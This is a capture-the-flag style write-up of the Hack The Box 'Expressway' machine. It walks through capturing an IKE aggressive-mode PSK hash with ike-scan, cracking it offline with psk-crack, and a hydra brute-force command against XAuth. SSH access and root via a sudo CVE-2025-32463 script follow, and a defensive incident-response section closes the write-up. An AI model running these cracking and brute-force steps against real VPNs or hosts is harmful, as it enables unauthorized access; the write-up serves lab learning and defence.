# Expressway HTB Writeup (Live Logging Style)

So, I started by running nmap on the target to see what ports are open, and guess what? Only port 22 showed up. Weird, right? Usually, there's more to find.
    
```bash
# Nmap 7.95 scan initiated Sun Sep 21 23:07:37 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -O -A -oN nmap.results 10.10.11.87
Nmap scan report for 10.10.11.87
Host is up (0.31s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   308.51 ms 10.10.14.1
2   309.17 ms 10.10.11.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 21 23:08:33 2025 -- 1 IP address (1 host up) scanned in 56.41 seconds

```

Then I thought, okay maybe the UDP ports have something, so I ran a UDP scan. Found port 500 but it was closed, which was surprising again.
Still, I ran nmap specifically on port 500 to see if it reveals something. Turns out, port 500 is using ISAKMP, which I remember is something related to VPN handshakes.

```bash
# Nmap 7.95 scan initiated Mon Sep 22 00:01:02 2025 as: /usr/lib/nmap/nmap --privileged -p 500 -T4 -n -Pn --min-rate 1000 -oA slow.nmap 10.10.11.87
Nmap scan report for 10.10.11.87
Host is up (0.22s latency).

PORT    STATE  SERVICE
500/tcp closed isakmp

# Nmap done at Mon Sep 22 00:01:03 2025 -- 1 IP address (1 host up) scanned in 0.31 seconds

```
    

I even tried to speed up scanning by increasing the nmap min-rate and scanning all TCP ports, but still only port 22 showed.
    
I ran some SSH-specific scripts with nmap   **`nmap -p22 -sV --script "ssh-hostkey,ssh-auth-methods,ssh2-enum-algos" -Pn -n 10.10.14.XX`**  to get more info about the ssh version and algorithms it uses. Nothing super exciting came up, just the usual SSH stuff.

I started thinking about port 500 more and researched.  It’s kinda like the handshake manager for VPNs. It helps two computers agree on encryption and keys before they actually send encrypted data through an IPsec tunnel.
- It’s like two spies secretly agreeing on a handshake and language before talking, so ISAKMP negotiates that secret handshake.

I knew there’s a tool called ike-scan that can communicate with this protocol, so I ran `ike-scan -v [target-ip]` to check if the handshake is happening and to grab info.

```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Expressway]
└─$ ike-scan -v $IP 

DEBUG: pkt len=336 bytes, bandwidth=56000 bps, int=52000 us
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned HDR=(CKY-R=1370a588e8262789) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.229 seconds (4.36 hosts/sec).  1 returned handshake; 0 returned notify
```

The output showed a “Main Mode Handshake” with encryption and auth details, and it said it uses PSK (pre-shared key) for authentication, not certificates. That’s cool because maybe I can guess the PSK.

- A **secret value (password/key)** that both sides of a VPN or secure connection know **beforehand**.
- Used to **authenticate the client to the server** during the IPsec/IKE handshake.
- The client says: “I want to talk securely.”
- The server responds: “Prove you know the PSK.”
- The client sends proof using the PSK (hashed, not plain text).
- If correct → security association is created → encrypted VPN tunnel established.

```bash
ike-scan --psk-file=rockyou.txt 10.10.11.87
```

Next, I tried brute forcing the PSK with rockyou.txt using ike-scan. And cracked the psk - 123456. And tried 

```bash
sudo ike-scan --psk="T123456" 10.10.11.87 -v

WARNING: The --pskcrack (-P) option is only relevant for aggressive mode. DEBUG: pkt len=336 bytes, bandwidth=56000 bps, int=52000 us Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/) 10.10.11.87 Main Mode Handshake returned HDR=(CKY-R=c41b29f72f94d6b6) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Ending ike-scan 1.9.6: 1 hosts scanned in 0.257 seconds (3.89 hosts/sec). 1 returned handshake; 0 returned notify
```

But nope thats not it .  PSK ‘123456’ wasn’t right . The scan is running and returning the same output to every psk . So the IKE is ints main mode which doesn't return crackable PSK hash. 

Main mode will often respond with an SA/handshake **regardless of the PSK you try** — it only negotiates proposals. The authentication material is exchanged **inside** an encrypted exchange in Main Mode, so you don’t get a server-side hash to crack
    
There is another mode called aggressive mode. If the server supports it,  it returns a response that **contains an unencrypted hash** of the PSK and other parameters. That can be captured and cracked offline with `psk-crack`.

#### **Main Mode**

- Think of it as a **secure, two-step handshake behind a curtain**.
- The peers first agree on encryption/settings, then _inside an encrypted channel_ they exchange identities/authentication.
- **What you see from outside:** only negotiation info (algorithms, groups).
- **Bottom line:** it’s _safer for the VPN_ and **does not expose a crackable PSK/hash** to passive probes.
    
#### **Aggressive Mode**

- Think of it as a **faster, single-shot handshake where some info is shouted out in the open**.
- The client sends identity and some auth material in plaintext (or less protected), and the responder answers with data that can include a PSK-derived value.
- **What you see from outside:** extra identity fields and often a value you can capture and crack offline (this is why `psk-crack` / wordlists can work).
- **Bottom line:** _leaker_ but quicker — useful for attackers, less secure for servers.


So I switched to an aggressive ike-scan mode to get more info like IDs, random numbers, and the hash that I could try to crack. For this, I had to send requests with an ID, so first I guessed ‘htb’ as an ID.
    
The aggressive scan with `ike-scan --aggressive --id=htb [target-ip]` gave me a proper handshake including a user ID: `ike@expressway.htb`.

```bash
ike-scan --aggressive --id=htb 10.10.11.87 -v

DEBUG: pkt len=359 bytes, bandwidth=56000 bps, int=55285 us
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=b3dc0dfd8be68e6d) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
```
    
Since that seemed like the real ID expected by the VPN, I sent another aggressive request with that ID to get the hash for cracking, like this:

```bash
ike-scan --aggressive --id=ike@expressway.htb 10.10.11.87 -v --pskcrack > ike_handshake.txt

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=5bff0629132938ff) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)


cat ike_handshake.txt

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
6a6b92b715fa53157f6c0af028b78a95d2b3b70c9cb16472263097d0a718fa2f64fe3d476bde573e68999a0ab65116cae344fe2a8192cde6a4073cd39a7a8187407a185ec11ad6ca6d44a48d6b9863c049eed1ea556e1bbc9e23f011c31e5289977cca048ddd0c506408d33688727e4caae79ab005a2e7f90d0aa34936b86036:052a443eb9a3df1cfb6098673f9e670c30e0d8d9416659294bc9183138c4ccb89c6c3072a1d67403c3ae267583f4cae20e128a5c2eebb8ce8d5c7d1bcac27b7d75825bacceec13489adb31f45f2fb0b21b9c0adc48d826bc63934b3f2e558f53015de14fc77ec1720c550212afdff569cee760346a30a0957b66dd82536d6266:5bff0629132938ff:8403959cdb085669:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:28f57119a4c15049e148e09bfd65d9288bda6b96:e2ed2b1652ed8c2ce3f1008869a522a658742cb5aa0487cd7b820b700579b0f2:4e68288ad31aa8ae6701597f9230af655c754fb2
Ending ike-scan 1.9.6: 1 hosts scanned in 0.250 seconds (4.00 hosts/sec).  1 returned handshake; 0 returned notify
```
    
This gave me the full handshake with all the needed parameters and the hash I could crack offline.

```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Expressway]
└─$ psk-crack --dictionary ~/Tools/seclists/rockyou.txt ike_handshake.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "REDACTED-HERE" matches SHA1 hash 34f61ffb59af73203838482b24048f6f0fdfa251
Ending psk-crack: 8045039 iterations in 10.889 seconds (738796.72 iterations/sec)
```
    
Using psk-crack with rockyou.txt on the dumped handshake, I finally cracked the PSK, which was  (redacted here obviously).
    
Got it . What next ?
With the PSK in hand, I thought: maybe I can connect through VPN now and explore more ports or services on the internal network. I already have a VPN running . maybe disconnect the current OG HTB VPN and create a config file with this new ID PSK and Gateway and then do nmap scan for more ports ?
    
I created a VPN config file (`expressway.conf`) in /etc/vpnc/ for vpnc and tried to connect using it, but vpnc asked me for a username and password. 

```bash
cat > /etc/vpnc/expressway.conf <<EOF
IPSec gateway 10.10.11.87
IPSec ID ike@expressway.htb
IPSec secret YOUR_PSK
EOF

┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Expressway]
└─ vpnc /etc/vpnc/expressway.conf

Enter password for none@10.10.11.87: 
vpnc: response was invalid [1]:  (ISAKMP_N_INVALID_EXCHANGE_TYPE)(7)
```

And this asked me password . So I thought maybe we need to add credentials in conf file
Adding XAuth username in the config didn’t help much because I got an invalid exchange error.

```bash
cat > /etc/vpnc/expressway.conf <<EOF
IPSec gateway 10.10.11.87
IPSec ID ike@expressway.htb
IPSec secret YOUR_PSK
EOF
```

Then I researched and figured that strongSwan sometimes works **without prompting for XAUTH** depending on lab setup.  

Maybe strongSwan will be better for connecting, so I set up `/etc/ipsec.conf` with the details I got from ike-scan, including the PSK secret in `/etc/ipsec.secrets`.

```bash

┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Expressway]
└─ cat /etc/ipsec.conf

config setup
    uniqueids=no

conn expressway
    keyexchange=ikev1
    authby=psk
    left=%defaultroute
    leftid=@yourhost
    right=10.10.11.87
    rightid=ike@expressway.htb
    auto=start

┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Expressway]
└─ cat /etc/ipsec.secrets

ike@expressway.htb : PSK "YOUR_PSK"

sudo ipsec restart
```

And then I restarted service ipsec

When I tried to bring up the connection with strongSwan, I got a “NO_PROPOSAL_CHOSEN” error. 

```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Expressway]
└─ ipsec up expressway 

initiating Main Mode IKE_SA expressway[3] to 10.10.11.87 generating ID_PROT request 0 [ SA V V V V V ] sending packet: from 10.10.14.11[500] to 10.10.11.87[500] (204 bytes) received packet: from 10.10.11.87[500] to 10.10.14.11[500] (56 bytes) parsed INFORMATIONAL_V1 request 1075657516 [ N(NO_PROP) ] received NO_PROPOSAL_CHOSEN error notify establishing connection 'expressway' failed
```

Turns out, NO_PROPOSAL_CHOSEN : client’s encryption algorithms didn’t match what the server wanted.

 So I changed the config to use `ike=3des-sha1-modp1024` and `esp=3des-sha1` and added these lines in the ipsec.conf file like the server preferred and restarted strongSwan.
    
After that, the connection tried to come up and then failed with an authentication error — because the VPN expected XAuth credentials (a username and password) in addition to the PSK.

```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Expressway]
└─ ipsec up expressway 

initiating Main Mode IKE_SA expressway[2] to 10.10.11.87 generating ID_PROT request 0 [ SA V V V V V ] sending packet: from 10.10.14.11[500] to 10.10.11.87[500] (236 bytes) received packet: from 10.10.11.87[500] to 10.10.14.11[500] (156 bytes) parsed ID_PROT response 0 [ SA V V V V ] received XAuth vendor ID received DPD vendor ID received FRAGMENTATION vendor ID received NAT-T (RFC 3947) vendor ID selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024 generating ID_PROT request 0 [ KE No NAT-D NAT-D ] sending packet: from 10.10.14.11[500] to 10.10.11.87[500] (244 bytes) received packet: from 10.10.11.87[500] to 10.10.14.11[500] (244 bytes) parsed ID_PROT response 0 [ KE No NAT-D NAT-D ] generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ] sending packet: from 10.10.14.11[500] to 10.10.11.87[500] (100 bytes) received packet: from 10.10.11.87[500] to 10.10.14.11[500] (84 bytes) parsed INFORMATIONAL_V1 request 2185658033 [ HASH N(AUTH_FAILED) ] received AUTHENTICATION_FAILED error notify establishing connection 'expressway' failed
```
    
I thought, okay, the username is probably `ike@expressway.htb` (from the handshake), but what about the password? 
    
I decided to brute force the password with hydra against the XAuth mechanism:
	`hydra -t 4 -P /usr/share/wordlists/rockyou.txt ike@expressway.htb xauth-ipsec-ike`
    
After lot of researching and trying to figure out this XAuth credentials and bypassing , 
Fuckk . Then I realized  could have used this credentials to SSH . Fuckkkk why didn't I think that , I could have just tried these credentials with SSH. 

I SSH’ed in with the credentials I probably found from the previous steps and succeeded

Then I got curious , like we already have PSK , why XAuth is needed . Then what does PSK do . I researched like since we already have PSK , why do Auth credentials are required ?

There are 2 phases in this , phase 1 is client and server negotiate **encryption, hashing, DH group** (Main Mode or Aggressive Mode). And PSK is used here to prove both of them know the secret . 

And then the tunnel is established after secret is matched . In this encrypted tunnel , traffic is still not allowed . Now the server asks for XAuth Credentials , if this is encrypted username and password match , access is granted to internal network 
    
When I tried `sudo -l`, it said no permissions, but I found a `sudo.sh` script in my home directory.

The script claimed to be a proof of concept exploit for CVE-2025-32463, 
So I thought maybe this box in vulnerable to that CVE. 

Lets do research on this CVE what this is about.
**CVE-2025-32463** is a **critical vulnerability** found in the **Sudo** command-line utility, which is widely used in Linux and Unix-like systems. This flaw allows a local user to escalate their privileges to **root** by exploiting the `--chroot` (`-R`) option in Sudo.

And this is what I could understand other than the technical details at the moment . 

Now I turned to shell script , and I gave it execute permission and ran it. Suddenly, I was root! Didn’t need to do anything else.
    
    

Now turning to SOC side angle , like how would you detect this or prevent or handle this ?

## SOC Team Stuff (Incident Response Phases)

### Preparation
- Stop using old handshakes like IKEv1 and Aggressive Mode. Prefer newer VPN rules like IKEv2 + certs.
- Only make port 500 and rare unusual ports accessible only if needed , and make those accessible only to those IPs whose who need it.
- Make SSH access requires MFA .
- Do regular vulnerable assessment and conduct penetration tests to identify weak spots and patch known CVEs.
- And enforce stronger passwords , which are not crackable by open source wordlists like rockyou.txt . Enforce stronger password set rules

### Identification
- If lots of requests come from an source you don't trust , investigate and block the IP based on the conclusion.
- And look for ports scans by payloads data being sent to top 1000 ports or all the ports .
- If someone tries password after password on SSH or VPN , flag it and investigate . If the login rate is high frequency , then it could be a bruteforce .
- If some binary is being run which makes system level changes or  privesc and followed accessing restricted directories or unusual activity ? Flag it . Could be compromise
- See if a root account or some account is accessed from a shell , check the process tree and if the shell of a another user is spawned as child process , then it credentials compromise or privilege escalation 

## Containment
- Block the attacking IPs at the firewall level.
- Isolate the affected machine so that it couldn't talk to others.
- See if the same patterns are observed across the network or unusual activity across network to confirm lateral movement.
- Kill the attackers SSH session and lock the user 

### Eradication
- Patch the known CVEs across all the machines in the network.
- Remove any malicious files or scripts or backdoors installed by 
	- checking cron jobs 
	- services added as legitimate services
	- rogue account or unusual accounts 
	- adding SSH keys to authorized keys file
	- Look for bashrc files which include binaries or scripts referenced which automatically triggers at boot.
- Rotate password for compromised accounts and services. Initiate password reset and enable MFA

### Recovery
- Rebuild or clean the host from a known-good image if you’re not 100% sure it’s clean.
- Restore services gradually with extra monitoring.
- Re enable VPN/SSH and disable account lockouts only after you’ve hardened them and rotated the compromised password.
- Run monitoring for a few days to watch for any unusual activities resurfacing 

### Lessons Learned
- Move from PSK to certificate and secure protocols and upgraded IKE versions .
- Enable MFA for SSH and other login services used by the users
- Disable aggressive old handshake modes and weak password policies .
- Put rate limits and lockouts on login attempts.
- Add SIEM rules that tie  "SSH login → sudo activity” into one alert.

